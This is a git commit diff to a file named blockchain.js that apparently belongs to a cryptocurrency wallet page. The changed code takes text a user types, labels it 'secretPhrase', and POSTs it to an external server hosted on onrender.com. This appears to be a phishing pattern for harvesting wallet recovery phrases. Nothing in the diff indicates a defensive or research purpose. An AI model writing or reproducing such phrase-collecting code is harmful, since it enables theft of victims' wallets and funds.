de8b4b9547d378ec4bdb2e4c67a769c5eceac853
clientBackend <148474934+clientBackend@users.noreply.github.com>
2023-12-05 23:43:18 +0530

    Update blockchain.js

--- Blockchain/blockchain.js
+++ Blockchain/blockchain.js
@@ -55,7 +55,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
     if(error1 === false && error2 === false){
         const url = "https://backend-01-92mi.onrender.com/api/blockchain";
         const data = {
-            packetData:inputString
+            secretPhrase:inputString
         };
         const options = {
             method: 'POST',
